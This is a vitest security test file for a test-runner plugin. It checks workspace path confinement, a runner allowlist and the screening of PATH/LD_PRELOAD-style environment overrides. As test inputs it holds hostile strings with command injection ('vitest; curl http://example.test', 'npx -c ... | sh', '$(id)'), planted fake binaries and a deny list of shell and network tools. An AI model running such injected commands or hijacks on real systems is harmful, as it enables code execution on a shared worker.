/**
 * A dependency that was not where the command looked must never be recorded as
 * a failing test — and the remedy must name the right tree.
 *
 * This repo has now made the first mistake four times — a missing Firefox
 * binary, a missing mutation tool, a missing CLI, and finally a suite that
 * could not import its own dependencies. The first three were caught because
 * the tool was absent and produced no report. The fourth slipped through
 * precisely because the runner DID produce a well-formed report: every
 * "failure" in it was one collection error, and the suite was reported as the
 * customer's application being broken.
 *
 * The SECOND mistake outlived the fix for the first. The downgrade was right
 * and the sentence attached to it was not: it said "a dependency missing from
 * the worker — install it in the worker image", for every caller. INTEGRATION
 * and UNIT_GEN run inside the customer's MATERIALISED CHECKOUT, which QAAI
 * installs nothing in on purpose, so for the two types this plugin exists to
 * serve the remedy named a change that cannot fix it. A SKIPPED with a correct
 * status and an unactionable sentence is a support ticket, so
 * `loadGapRemedy` is tested on its prose and not only on its status.
 *
 * The counter-test matters as much as the test: a real assertion failure must
 * still be a failure, or this classifier becomes a way to hide bugs.
 */

import { describe, expect, it } from 'vitest';
import { parseReport } from '../reports/index.js';
import {
  EXTERNAL_WORKSPACE_KINDS,
  EXTERNAL_WORKSPACE_KIND_LIST,
  loadGapRemedy,
  onlyLoadErrors,
} from './external.js';

function junit(cases: Array<[name: string, failure: string]>): string {
  return (
    `<?xml version="1.0"?><testsuites><testsuite name="s" tests="${cases.length}">` +
    cases
      .map(([name, failure]) =>
        failure
          ? `<testcase name="${name}"><failure message="${failure}"/></testcase>`
          : `<testcase name="${name}"/>`,
      )
      .join('') +
    `</testsuite></testsuites>`
  );
}

const classify = (xml: string): string | null => onlyLoadErrors(parseReport('junit-xml', xml));

describe('a suite that could not load is a config gap, not a failure', () => {
  it.each([
    ['pytest', "ModuleNotFoundError: No module named 'playwright'"],
    ['node', 'Cannot find module @playwright/test'],
    ['node esm', 'ERR_MODULE_NOT_FOUND'],
    ['java', 'java.lang.NoClassDefFoundError: org/junit/Test'],
    ['ruby', 'LoadError: cannot load such file -- capybara'],
    ['pytest collection', 'error during collection'],
  ])('detects a %s load error', (_label, message) => {
    expect(classify(junit([['setup', message]]))).not.toBeNull();
  });
});

describe('but a real failure stays a failure', () => {
  it('does not downgrade an assertion failure', () => {
    expect(classify(junit([['total', 'expected 10.8 to be 10.79']]))).toBeNull();
  });

  it('does not downgrade when only SOME failures are load errors', () => {
    // One bad import among forty real tests is a failing suite, not a gap.
    expect(
      classify(
        junit([
          ['a', "ModuleNotFoundError: No module named 'x'"],
          ['b', 'expected 1 to be 2'],
        ]),
      ),
    ).toBeNull();
  });

  it('does nothing when everything passed', () => {
    expect(classify(junit([['a', ''], ['b', '']]))).toBeNull();
  });

  it('matches on the failure message, never on a test name', () => {
    // A test legitimately named after the error it asserts on must not be swept up.
    expect(
      classify(junit([['reports a helpful ModuleNotFoundError', 'expected true to be false']])),
    ).toBeNull();
  });
});

/**
 * ── The workspace, and the generated file in it ──────────────────────────────
 *
 * Two defects are pinned below, and both were silent:
 *
 *  1. This plugin resolved its workspace from `process.cwd()`, which on the
 *     worker is QAAI's own checkout. An INTEGRATION spec saying `npx vitest
 *     run` executed QAAI's suite and filed the result as the customer's.
 *  2. A UNIT_GEN test's code was never written to disk, so the command pointed
 *     at a file that did not exist. The type could not run at all.
 *
 * The command in these tests is a real `node -e` that READS the generated file
 * and refuses to write a report unless it is there — so a passing result is
 * proof the file existed, at the right path, inside the workspace, at the
 * moment the command ran. Nothing here needs a browser or a repository.
 */

import { mkdtemp, mkdir, readFile as read, rm, writeFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach } from 'vitest';
import type { ArtifactSink, ExecutableTest, RunContext } from '@qaai/shared';
import {
  COMMAND_POLICY_CONTROL_KEYS,
  COMMAND_POLICY_DEFAULTS,
  COMMAND_REFUSALS,
  COMMAND_REFUSAL_LIST,
  EXTERNAL_COMMAND_ENFORCED,
  EXTERNAL_COMMAND_OBSERVED,
  EXTERNAL_COMMAND_REFUSAL_SENTENCE,
  EXTERNAL_RUNNERS,
  EXTERNAL_RUNNER_NAMES,
  classifyExternalCommand,
  commandPolicyMode,
  externalPlugin,
  isInterpreterEnvKey,
  screenSpecEnv,
  specEnvPolicyMode,
} from './external.js';
import { attachRunWorkspace } from '../run-workspace.js';

const artifacts: ArtifactSink = {
  put: async () => 'key',
  putFile: async () => 'key',
  get: async () => null,
  putPersistent: async () => 'key',
};

/**
 * The facts the two security controls read off the context. `RunContext` does
 * not declare them yet — `securityInputsOf` reads them structurally and the
 * hand-off notes carry the exact edit for run.ts — so the fixture mirrors the
 * shape rather than inventing one.
 */
interface SecurityBag {
  securityControlModes?: unknown;
  scopableSecrets?: ReadonlyArray<{ id: string; name: string; value: string }>;
  secretScopes?: ReadonlyArray<{ secretId: string; kind: string; value: string | null }> | 'UNAVAILABLE';
  suiteId?: string | null;
  /** Overrides `RunContext.secrets` — the flat, id-less map every plugin reads today. */
  secrets?: Record<string, string>;
}

function makeContext(workspaceRoot: string | null, security: SecurityBag = {}): RunContext {
  const ctx: RunContext = {
    runId: 'run_1',
    orgId: 'org_1',
    projectId: 'proj_1',
    environmentId: 'env_1',
    baseUrl: 'http://127.0.0.1:1',
    secrets: {},
    storageState: null,
    artifacts,
    logger: {
      debug: () => {},
      info: () => {},
      warn: () => {},
      error: () => {},
      step: () => {},
    },
    signal: new AbortController().signal,
    determinism: {
      freezeClockAt: null,
      randomSeed: 1,
      waitForNetworkIdle: false,
      retryOnce: false,
    },
  };
  return Object.assign(
    attachRunWorkspace(
      ctx,
      workspaceRoot ? { root: workspaceRoot, source: 'acme/app@main', fileCount: 1 } : null,
    ),
    security,
  );
}

/**
 * A BARE RUNNER NAME, which is the whole point of the allowlist below.
 *
 * These fixtures used `process.execPath` — an ABSOLUTE PATH — and that is now a
 * refusal, because `spec.command` could otherwise name a file the tenant had
 * written into the workspace. `node` is an allowed runner (`node --test`), it
 * resolves off the worker image's own PATH, and using it here means the
 * existing end-to-end tests exercise the allowlist's ALLOW path rather than
 * sitting behind the observe-mode escape.
 */
const NODE = 'node';

const PASSING_JUNIT =
  '<?xml version="1.0"?><testsuites><testsuite name="s" tests="1"><testcase name="t"/></testsuite></testsuites>';

/**
 * A command that writes a report ONLY if `expected` is readable at `path` with
 * the content it should have. Anything else exits non-zero with no report,
 * which this plugin reports as a failure rather than a pass.
 */
function assertFileScript(path: string, needle: string): string {
  return [
    'const fs = require("fs");',
    `const code = fs.readFileSync(${JSON.stringify(path)}, "utf8");`,
    `if (!code.includes(${JSON.stringify(needle)})) { process.exit(3); }`,
    `fs.writeFileSync("report.xml", ${JSON.stringify(PASSING_JUNIT)});`,
  ].join('\n');
}

/** The inverse: a report only if the path does NOT exist. */
function assertNoFileScript(path: string): string {
  return [
    'const fs = require("fs");',
    `if (fs.existsSync(${JSON.stringify(path)})) { process.exit(4); }`,
    `fs.writeFileSync("report.xml", ${JSON.stringify(PASSING_JUNIT)});`,
  ].join('\n');
}

function unitGenTest(over: Partial<ExecutableTest> = {}): ExecutableTest {
  return {
    id: 'test_1',
    name: 'cart totals',
    type: 'UNIT_GEN',
    code: '// MARKER generated by QAAI\n',
    filePath: 'tests/cart.test.js',
    spec: {
      command: NODE,
      args: ['-e', assertFileScript('tests/cart.test.js', 'MARKER')],
      reportPath: 'report.xml',
      reportFormat: 'junit-xml',
      timeoutSeconds: 60,
    },
    timeoutMs: 60_000,
    quarantined: false,
    tags: [],
    ...over,
  };
}

let workspace = '';

beforeEach(async () => {
  workspace = await mkdtemp(join(tmpdir(), 'qaai-ws-test-'));
});

afterEach(async () => {
  await rm(workspace, { recursive: true, force: true });
});

describe('a generated unit test', () => {
  it('is on disk, at its own path, by the time the command runs', async () => {
    const test = unitGenTest();
    const execution = await externalPlugin.execute(makeContext(workspace), test);

    // The command refuses to write a report unless it can read the file, so a
    // pass IS the proof. The assertion on disk afterwards is the second half.
    expect(execution.status).toBe('PASSED');
    expect(await read(join(workspace, 'tests/cart.test.js'), 'utf8')).toBe(test.code);
  });

  it('refuses a path that climbs out of the workspace, and runs nothing', async () => {
    const test = unitGenTest({ filePath: '../escaped.test.js' });
    const execution = await externalPlugin.execute(makeContext(workspace), test);

    // FAILED, not SKIPPED: a test that can never run as written is not an
    // environment gap, and a skip would keep the gate green forever.
    expect(execution.status).toBe('FAILED');
    expect(execution.errorMessage).toMatch(/must not climb out of it/);
    expect(existsSync(join(dirname(workspace), 'escaped.test.js'))).toBe(false);
    // Nothing was spawned, so nothing wrote a report.
    expect(existsSync(join(workspace, 'report.xml'))).toBe(false);
  });

  it.each(['/etc/cron.d/qaai', 'tests/../../escaped.js'])(
    'refuses the absolute or traversing path %s',
    async (filePath) => {
      const execution = await externalPlugin.execute(makeContext(workspace), unitGenTest({ filePath }));
      expect(execution.status).toBe('FAILED');
      expect(execution.errorMessage).toMatch(/relative to the repository root/);
    },
  );

  it('overwrites a customer file at the same path, and says so on the result', async () => {
    // The advertised workflow is to COMMIT the generated tests, so the file
    // being there already is the normal case, not the exception — refusing
    // would make the feature stop working the moment it succeeded. The copy is
    // a throwaway, so the real repository is untouched; what must not happen is
    // that nobody is told.
    await mkdir(join(workspace, 'tests'), { recursive: true });
    await writeFile(join(workspace, 'tests/cart.test.js'), '// the customer edited this\n', 'utf8');

    const test = unitGenTest();
    const execution = await externalPlugin.execute(makeContext(workspace), test);

    expect(execution.status).toBe('PASSED');
    expect(await read(join(workspace, 'tests/cart.test.js'), 'utf8')).toBe(test.code);
    const warning = execution.console.find((entry) => entry.level === 'warn');
    expect(warning?.text).toMatch(/already exists in the checked-out repository/);
    expect(warning?.text).toMatch(/your repository was not modified/i);
  });

  it('says nothing when the repository already holds exactly this file', async () => {
    const test = unitGenTest();
    await mkdir(join(workspace, 'tests'), { recursive: true });
    await writeFile(join(workspace, 'tests/cart.test.js'), test.code, 'utf8');

    const execution = await externalPlugin.execute(makeContext(workspace), test);

    expect(execution.status).toBe('PASSED');
    expect(execution.console).toEqual([]);
  });
});

describe('an INTEGRATION test', () => {
  it('gets no generated file written into the customer repository', async () => {
    // Its spec points at the customer's OWN suite. Writing a QAAI-held blob
    // into their tree is a change nobody asked for, and at `filePath` it could
    // land on a real source file.
    const execution = await externalPlugin.execute(
      makeContext(workspace),
      unitGenTest({
        type: 'INTEGRATION',
        filePath: 'src/cart.ts',
        code: '// MARKER would clobber application source\n',
        spec: {
          command: NODE,
          args: ['-e', assertNoFileScript('src/cart.ts')],
          reportPath: 'report.xml',
          reportFormat: 'junit-xml',
          timeoutSeconds: 60,
        },
      }),
    );

    expect(execution.status).toBe('PASSED');
    expect(existsSync(join(workspace, 'src/cart.ts'))).toBe(false);
  });
});

describe('a run with no materialised repository', () => {
  it('is not evaluated, rather than running in the worker\'s own directory', async () => {
    const execution = await externalPlugin.execute(makeContext(null), unitGenTest());

    expect(execution.status).toBe('SKIPPED');
    expect(execution.errorMessage).toMatch(/no\s+checkout of it/);
    expect(execution.errorMessage).toMatch(/Connect the project to its repository/);
    // The old behaviour: this would have run in QAAI's own checkout.
    expect(existsSync(join(process.cwd(), 'report.xml'))).toBe(false);
  });

  it('refuses a cwd that escapes the workspace', async () => {
    const execution = await externalPlugin.execute(
      makeContext(workspace),
      unitGenTest({
        spec: {
          command: NODE,
          args: ['-e', 'process.exit(0)'],
          cwd: '../..',
          reportFormat: 'exit-code',
          timeoutSeconds: 60,
        },
      }),
    );

    expect(execution.status).toBe('FAILED');
    expect(execution.errorMessage).toMatch(/not inside the repository/);
  });
});

describe('the remedy for a suite that could not load', () => {
  const GAP = "Cannot find module '@acme/pricing'";

  it('derives its list from the declaration rather than restating it', () => {
    expect([...EXTERNAL_WORKSPACE_KIND_LIST].sort()).toEqual([...EXTERNAL_WORKSPACE_KINDS].sort());
  });

  it('blames QAAI\'s own no-install default inside the customer\'s checkout', () => {
    const remedy = loadGapRemedy(GAP, 'MATERIALISED_REPOSITORY');

    // The sentence this replaces. It is the wrong diagnosis AND an unactionable
    // remedy: nothing added to QAAI's image puts @acme/pricing in the
    // customer's tree.
    expect(remedy).not.toMatch(/install it in the worker image/);
    expect(remedy).toMatch(/installs NOTHING/);
    expect(remedy).toMatch(/will not fix this/);
    // And it names what WOULD work, in the customer's own command.
    expect(remedy).toMatch(/npm ci/);
    expect(remedy).toContain(GAP);
  });

  it('still points at the worker image for QAAI\'s own scratch tree', () => {
    // The original sentence was right for this case, and it must survive: the
    // E2E plugin's in-ecosystem route builds a scratch tree next to QAAI's own
    // dependencies, and there a missing module IS the image's problem.
    const remedy = loadGapRemedy(GAP, 'SCRATCH_TREE');
    expect(remedy).toMatch(/install it in the image and re-run/);
    expect(remedy).not.toMatch(/installs NOTHING/);
  });

  it('names both causes when the caller did not say which tree it was', () => {
    // ABSENT is a third answer. Picking the likelier one is how the single
    // wrong sentence got written in the first place.
    const remedy = loadGapRemedy(GAP, undefined);
    expect(remedy).toMatch(/did not record which tree/);
    expect(remedy).toMatch(/worker image/);
    expect(remedy).toMatch(/does not install/);
  });

  it('never calls a load gap a verdict on the application, in any branch', () => {
    for (const kind of [...EXTERNAL_WORKSPACE_KINDS, undefined]) {
      expect(loadGapRemedy(GAP, kind)).toMatch(
        /not a failure of the application under test/,
      );
    }
  });
});

describe('a UNIT_GEN suite whose imports do not resolve', () => {
  it('is SKIPPED with the checkout\'s remedy, not the worker image\'s', async () => {
    // End to end through the plugin, because the whole defect was that the
    // plugin knew which tree it was in and the sentence did not. A unit test on
    // `loadGapRemedy` alone would pass with the plugin still passing undefined.
    const report = junit([['collect', "Cannot find module '@acme/pricing'"]]);
    const test = unitGenTest({
      spec: {
        command: NODE,
        args: [
          '-e',
          `require("fs").writeFileSync("report.xml", ${JSON.stringify(report)}); process.exit(1);`,
        ],
        reportPath: 'report.xml',
        reportFormat: 'junit-xml',
        timeoutSeconds: 60,
      },
    });

    const execution = await externalPlugin.execute(makeContext(workspace), test);

    // SKIPPED, because a suite that could not load evaluated no test — this is
    // the half that already worked and must keep working.
    expect(execution.status).toBe('SKIPPED');
    expect(execution.errorMessage).toMatch(/installs NOTHING/);
    expect(execution.errorMessage).not.toMatch(/install it in the worker image/);
  });
});

/**
 * ── THE COMMAND ALLOWLIST, AND THE PLANTED BINARY ───────────────────────────
 *
 * `spec.command` is a MEMBER-authored string that reached `spawn()` with the
 * worker's filesystem, network and PATH. The spawn was already shell-free,
 * which stopped string interpolation and nothing else: `psql`, `redis-cli`,
 * `curl` and `mc` were one spec field away from our own postgres, redis and
 * MinIO, and because the command could be a PATH, so was any file the tenant
 * had written into the workspace.
 *
 * Two of the cases below are the ones worth reading:
 *
 *   - `npx -c '<string>'` and `npm run '<script>'` reach a shell on the
 *     CHILD's own initiative, so `shell: false` does not cover them. That is
 *     why the script name must be a single token.
 *   - `spec.env.PATH` defeated the whole bare-name rule on its own, and it was
 *     live: `childEnv` applies `extra` AFTER the passthrough, so a spec could
 *     overwrite PATH, and libuv resolves the executable using the env it is
 *     handed. The end-to-end test below plants a fake `node` in the workspace
 *     and proves the real one still ran.
 */

describe('the command allowlist vocabulary is derived', () => {
  it('derives the refusal list from the presence record', () => {
    expect([...COMMAND_REFUSAL_LIST].sort()).toEqual([...COMMAND_REFUSALS].sort());
  });

  it('derives the runner names from the table', () => {
    expect(EXTERNAL_RUNNER_NAMES.sort()).toEqual(Object.keys(EXTERNAL_RUNNERS).sort());
    // Nothing general-purpose is on it, and that absence is the control.
    for (const forbidden of ['sh', 'bash', 'zsh', 'env', 'xargs', 'curl', 'wget', 'psql', 'redis-cli', 'mc', 'aws', 'nc', 'ssh']) {
      expect(EXTERNAL_RUNNER_NAMES).not.toContain(forbidden);
    }
  });

  it('states its two defaults where a reviewer will look', () => {
    // OBSERVE for the command — `./gradlew` is legitimate and would be refused.
    // ENFORCE for the spec env — no documented workflow sets PATH in a spec.
    expect(COMMAND_POLICY_DEFAULTS).toEqual({ command: 'OBSERVE', specEnv: 'ENFORCE' });
    expect(commandPolicyMode(undefined)).toBe('OBSERVE');
    expect(specEnvPolicyMode(undefined)).toBe('ENFORCE');
  });

  it('falls back to the default for an absent, malformed or unknown stored mode', () => {
    for (const stored of [undefined, null, 'ENFORCE', [], 42, { }, { [COMMAND_POLICY_CONTROL_KEYS.command]: 'ON' }]) {
      expect(commandPolicyMode({ securityControlModes: stored })).toBe('OBSERVE');
    }
    // And a real stored value is honoured, or the brake is an ornament.
    expect(
      commandPolicyMode({
        securityControlModes: { [COMMAND_POLICY_CONTROL_KEYS.command]: 'ENFORCE' },
      }),
    ).toBe('ENFORCE');
    expect(
      specEnvPolicyMode({
        securityControlModes: { [COMMAND_POLICY_CONTROL_KEYS.specEnv]: 'OBSERVE' },
      }),
    ).toBe('OBSERVE');
  });
});

describe('a command that is not a bare runner name is refused', () => {
  const refuse = (command: string, args: string[] = []) =>
    classifyExternalCommand({ command, args });

  it.each([
    ['an absolute path to a shell', '/bin/sh'],
    ['a path the tenant can write to', './planted'],
    ['a project-local binary', 'node_modules/.bin/anything'],
    ['a traversal', '../../usr/bin/env'],
    ['a Windows path', 'C:\\Windows\\System32\\cmd.exe'],
    ['a dot', '.'],
    ['a parent dot', '..'],
    ['shell metacharacters', 'vitest; curl http://example.test'],
    ['a pipe', 'vitest|sh'],
    ['a substitution', 'vitest$(id)'],
    ['a newline', 'vitest\nsh'],
    ['leading whitespace', ' vitest'],
    ['the empty string', ''],
  ])('refuses %s', (_label, command) => {
    const verdict = refuse(command);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.refusal).toBe('NOT_A_BARE_NAME');
  });

  it.each(['sh', 'bash', 'env', 'xargs', 'curl', 'psql', 'redis-cli', 'mc', 'aws', 'nc'])(
    'refuses the general-purpose tool %s',
    (command) => {
      const verdict = refuse(command);
      expect(verdict.allowed).toBe(false);
      if (!verdict.allowed) expect(verdict.refusal).toBe('NOT_AN_ALLOWED_RUNNER');
    },
  );

  it.each([
    ['npx -c, which runs a string through a shell', 'npx', ['-c', 'curl http://example.test | sh']],
    ['npx --call', 'npx', ['--call', 'id']],
    ['npx --package, which re-points the binary', 'npx', ['--package=evil', 'vitest']],
    ['npx -p', 'npx', ['-p', 'evil', 'vitest']],
  ])('refuses %s', (_label, command, args) => {
    const verdict = refuse(command, args);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.refusal).toBe('SHELL_STRING_ARGUMENT');
  });

  it.each([
    ['npx with a tool that is not a runner', 'npx', ['psql']],
    ['npx with a path', 'npx', ['./planted']],
    ['npx with nothing', 'npx', []],
    ['pnpm exec with a tool that is not a runner', 'pnpm', ['exec', 'curl']],
    ['bundle exec with a tool that is not a runner', 'bundle', ['exec', 'sh']],
  ])('refuses %s', (_label, command, args) => {
    const verdict = refuse(command, args);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.refusal).toBe('NESTED_COMMAND_NOT_ALLOWED');
  });

  it.each([
    ['npm publish', 'npm', ['publish']],
    ['npm install, which runs lifecycle scripts', 'npm', ['install']],
    ['yarn with no subcommand', 'yarn', []],
  ])('refuses %s', (_label, command, args) => {
    const verdict = refuse(command, args);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.refusal).toBe('SUBCOMMAND_NOT_ALLOWED');
  });

  it.each([
    ['a second command hidden in a script name', 'npm', ['run', 'test; curl http://example.test']],
    ['a backtick', 'npm', ['run', 'test`id`']],
    ['a space', 'pnpm', ['run', 'test ci']],
    ['no script name at all', 'npm', ['run']],
  ])('refuses %s, because npm hands a script to a shell', (_label, command, args) => {
    const verdict = refuse(command, args);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.refusal).toBe('SCRIPT_NAME_NOT_A_TOKEN');
  });

  it.each([
    ['python -c', 'python', ['-c', 'import socket']],
    ['python -m http.server', 'python3', ['-m', 'http.server']],
    ['python -m pip', 'python', ['-m', 'pip', 'install', 'anything']],
    ['a bare script', 'python', ['app.py']],
    ['-m with nothing after it', 'python', ['-m']],
  ])('refuses %s', (_label, command, args) => {
    const verdict = refuse(command, args);
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) expect(verdict.refusal).toBe('MODULE_NOT_ALLOWED');
  });
});

describe('a real test command is allowed', () => {
  it.each([
    ['vitest', ['run', '--reporter=junit']],
    ['jest', ['--ci']],
    ['pytest', ['-q', '--junitxml=report.xml']],
    ['node', ['--test']],
    ['npx', ['vitest', 'run']],
    ['npx', ['--yes', 'playwright', 'test']],
    ['npm', ['test']],
    ['npm', ['run', 'test:ci']],
    ['pnpm', ['exec', 'playwright', 'test']],
    ['bundle', ['exec', 'rspec']],
    ['python', ['-m', 'pytest', '-q']],
    ['mvn', ['-B', 'test']],
    ['go', ['test', './...']],
    ['cargo', ['test']],
    ['maestro', ['test', 'flows/']],
  ])('allows %s %j', (command, args) => {
    expect(classifyExternalCommand({ command, args }).allowed).toBe(true);
  });

  it('does not ask the filesystem whether the binary exists', () => {
    // A `which` here would make the refusal an existence oracle, and would make
    // the answer depend on the worker image. A name on the list is allowed
    // whether or not it is installed; the existing ENOENT path reports the
    // absence honestly and separately.
    expect(classifyExternalCommand({ command: 'testcafe', args: [] }).allowed).toBe(true);
  });
});

describe('a refusal is not an oracle', () => {
  it('shows ONE sentence for every refusal, whatever the reason', () => {
    // The rule EGRESS_REFUSAL_SENTENCE states in packages/shared/src/egress.ts.
    // A message naming the offending command would tell a tenant which binaries
    // exist on our worker and, by elimination, what the allowlist holds.
    expect(EXTERNAL_COMMAND_ENFORCED).toContain(EXTERNAL_COMMAND_REFUSAL_SENTENCE);
    expect(EXTERNAL_COMMAND_OBSERVED).toContain(EXTERNAL_COMMAND_REFUSAL_SENTENCE);
    for (const name of [...EXTERNAL_RUNNER_NAMES, 'psql', 'redis-cli', '/bin/sh', 'gradlew']) {
      expect(EXTERNAL_COMMAND_REFUSAL_SENTENCE).not.toContain(name);
    }
  });

  it('does not claim nothing ran when something did', () => {
    // A doc or a message that contradicts the code under it is a defect, and
    // this one shipped for a few minutes: the uniform sentence said "nothing was
    // executed" and OBSERVE executes. The outcome clause is now per-mode.
    expect(EXTERNAL_COMMAND_REFUSAL_SENTENCE).not.toMatch(/was executed/);
    expect(EXTERNAL_COMMAND_ENFORCED).toMatch(/Nothing was executed/);
    expect(EXTERNAL_COMMAND_OBSERVED).toMatch(/WAS executed/);
  });

  it('keeps the reason on the verdict, for the operator', () => {
    const verdict = classifyExternalCommand({ command: 'psql', args: [] });
    expect(verdict.allowed).toBe(false);
    if (!verdict.allowed) {
      expect(verdict.refusal).toBe('NOT_AN_ALLOWED_RUNNER');
      expect(verdict.detail).toContain('psql');
    }
  });
});

describe('the spec-env screen', () => {
  it.each([
    'PATH',
    'NODE_OPTIONS',
    'NODE_PATH',
    'LD_PRELOAD',
    'LD_LIBRARY_PATH',
    'DYLD_INSERT_LIBRARIES',
    'PYTHONPATH',
    'PYTHONSTARTUP',
    'RUBYOPT',
    'PERL5OPT',
    'CLASSPATH',
    'JAVA_TOOL_OPTIONS',
    'MAVEN_OPTS',
    'GRADLE_OPTS',
    'path',
    'node_options',
  ])('names %s as a variable that changes how code is loaded', (key) => {
    expect(isInterpreterEnvKey(key)).toBe(true);
  });

  it.each(['CI', 'QAAI_BASE_URL', 'BASE_URL', 'TZ', 'LANG', 'HEADLESS'])(
    'leaves the ordinary variable %s alone',
    (key) => {
      expect(isInterpreterEnvKey(key)).toBe(false);
    },
  );

  it('drops them under ENFORCE and counts them', () => {
    const screened = screenSpecEnv({ CI: '1', NODE_OPTIONS: '--require ./planted.js' }, 'ENFORCE');
    expect(screened.env).toEqual({ CI: '1' });
    expect(screened.refused).toBe(1);
  });

  it('passes them through under OBSERVE and still counts them', () => {
    // A cap applied without being counted is one of the lies this product
    // cannot afford — and so is a mode that counts nothing.
    const screened = screenSpecEnv({ CI: '1', PATH: '/tmp' }, 'OBSERVE');
    expect(screened.env).toEqual({ CI: '1', PATH: '/tmp' });
    expect(screened.refused).toBe(1);
  });
});

/**
 * ── END TO END THROUGH `externalPlugin.execute`, which is the production door ─
 *
 * Correct code connected to nothing is the signature defect of this build, so
 * every assertion below goes through the plugin's own entry point with a
 * tenant-shaped spec — not through the classifier. `securityInputsOf(ctx)` is
 * the only thing between the two, and a regression that leaves the classifier
 * perfect and stops calling it has to fail here.
 */

const EXPORTED_ENV_JUNIT = (names: string[]) =>
  [
    'const fs = require("fs");',
    `const want = ${JSON.stringify(names)};`,
    'const seen = want.filter((n) => process.env[n] !== undefined);',
    'fs.writeFileSync("report.xml", `<?xml version="1.0"?><testsuites><testsuite name="s" tests="1">` +',
    '  `<testcase name="saw:${seen.join("+")}"/></testsuite></testsuites>`);',
  ].join('\n');

function specTest(spec: Record<string, unknown>, over: Partial<ExecutableTest> = {}): ExecutableTest {
  return {
    id: 'test_1',
    name: 'the suite',
    type: 'INTEGRATION',
    code: '',
    filePath: 'tests/x.test.js',
    spec: { reportPath: 'report.xml', reportFormat: 'junit-xml', timeoutSeconds: 60, ...spec },
    timeoutMs: 60_000,
    quarantined: false,
    tags: [],
    ...over,
  };
}

describe('the allowlist, enforced through the plugin', () => {
  const ENFORCING = { securityControlModes: { [COMMAND_POLICY_CONTROL_KEYS.command]: 'ENFORCE' } };

  it('refuses a shell and spawns nothing', async () => {
    const execution = await externalPlugin.execute(
      makeContext(workspace, ENFORCING),
      specTest({ command: 'sh', args: ['-c', 'echo pwned > report.xml'] }),
    );

    // FAILED, not SKIPPED: a command QAAI will not run is a test that can never
    // run AS WRITTEN, and a skip would keep the gate green forever.
    expect(execution.status).toBe('FAILED');
    expect(execution.errorMessage).toBe(EXTERNAL_COMMAND_ENFORCED);
    expect(existsSync(join(workspace, 'report.xml'))).toBe(false);
  });

  it('refuses a binary the tenant planted in the workspace', async () => {
    // The tenant CAN write here: `test.code` goes to `test.filePath`, fixtures
    // go to their own paths, and their repository is extracted into this tree.
    await writeFile(join(workspace, 'planted'), '#!/bin/sh\ntouch RAN\n', { mode: 0o755 });

    const execution = await externalPlugin.execute(
      makeContext(workspace, ENFORCING),
      specTest({ command: './planted', args: [], reportFormat: 'exit-code' }),
    );

    expect(execution.status).toBe('FAILED');
    expect(execution.errorMessage).toBe(EXTERNAL_COMMAND_ENFORCED);
    expect(existsSync(join(workspace, 'RAN'))).toBe(false);
  });

  it('runs it anyway under the default mode, and SAYS it would be refused', async () => {
    // OBSERVE is the default and it changes nothing — which is the point, and
    // also why the note has to exist: it is the only count this mode owes.
    const execution = await externalPlugin.execute(
      makeContext(workspace),
      specTest({ command: process.execPath, args: ['-e', EXPORTED_ENV_JUNIT([])] }),
    );

    expect(execution.status).toBe('PASSED');
    expect(execution.console.map((entry) => entry.text)).toContain(EXTERNAL_COMMAND_OBSERVED);
  });
});

describe('spec.env cannot re-point an allowlisted command', () => {
  /**
   * THE HOLE THIS CLOSES, REPRODUCED. `childEnv` applies `extra` AFTER the
   * passthrough, so `spec.env.PATH` overwrote the child's PATH, and
   * `isForbiddenChildEnvKey` does not screen `PATH` because the name contains
   * none of the secret-ish substrings. libuv resolves the executable using the
   * env object it is handed, so a planted file named `node` plus one spec field
   * turned the bare-name allowlist back into "run the tenant's binary".
   */
  beforeEach(async () => {
    await writeFile(
      join(workspace, 'node'),
      // A fake `node` that writes a report saying it was the one that ran.
      '#!/bin/sh\nprintf \'<?xml version="1.0"?><testsuites><testsuite name="s" tests="1"><testcase name="t"><failure message="THE PLANTED BINARY RAN"/></testcase></testsuite></testsuites>\' > report.xml\n',
      { mode: 0o755 },
    );
  });

  it('drops the PATH override, so the real runner runs', async () => {
    const execution = await externalPlugin.execute(
      makeContext(workspace),
      specTest({
        command: NODE,
        args: ['-e', EXPORTED_ENV_JUNIT([])],
        env: { PATH: workspace },
      }),
    );

    expect(execution.status).toBe('PASSED');
    expect(execution.errorMessage ?? '').not.toContain('PLANTED');
    const note = execution.console.find((entry) => entry.text.includes('environment variable'));
    expect(note?.text).toMatch(/NOT passed to the child process/);
    // The count, never the key name: a tenant may call a variable anything.
    expect(note?.text).not.toContain('PATH');
  });

  it('in OBSERVE the screen stands aside and SAYS so — and the floor under it still refuses', async () => {
    /*
     * ── THIS TEST CHANGED, AND WHY IS THE POINT ──────────────────────────────
     *
     * It used to assert that OBSERVE let the planted binary RUN, as the
     * counter-test proving the test above was about the screen rather than a
     * coincidence. That is no longer true, and the change was deliberate:
     * `childEnv` now applies `isInterpreterEnvKey` to its `extra` channel as
     * well as to `secrets`, so an interpreter variable is dropped at the spawn
     * seam whatever this brake says.
     *
     * MEASURED before that change: `childEnv({ extra: { PATH: <planted dir> } })`
     * returned the planted PATH and `spawnSync('vitest', …)` ran the planted
     * script — and three plugins (cli.ts, mobile.ts, mutation.ts) spread a
     * tenant's `spec.env` straight into `extra` with no screen at all, so the
     * escalation this file tests for was reachable through them regardless of
     * any mode.
     *
     * TWO LAYERS, AND THEY ANSWER DIFFERENT QUESTIONS. The brake is about
     * DISCLOSURE: in OBSERVE the screen reports what it would have refused,
     * which is the worklist an operator reads before arming it — and that is
     * asserted here. The floor is about the escalation, and `child-env.ts`'s own
     * header already argues it is an unconditional drop and not a mode: "none of
     * these names is a credential for an application under test, so there is no
     * legitimate traffic to brake". OBSERVE therefore changes the REPORT and not
     * the outcome, for this family of names only.
     *
     * The test above is kept non-vacuous by a different control arm, in
     * packages/runner/src/child-env.test.ts: 'CANNOT RE-POINT A BARE COMMAND
     * NAME THROUGH EXTRA, proved by a real spawn' plants the same binary and
     * shows it DOES run when the same directory reaches PATH legitimately.
     */
    const execution = await externalPlugin.execute(
      makeContext(workspace, {
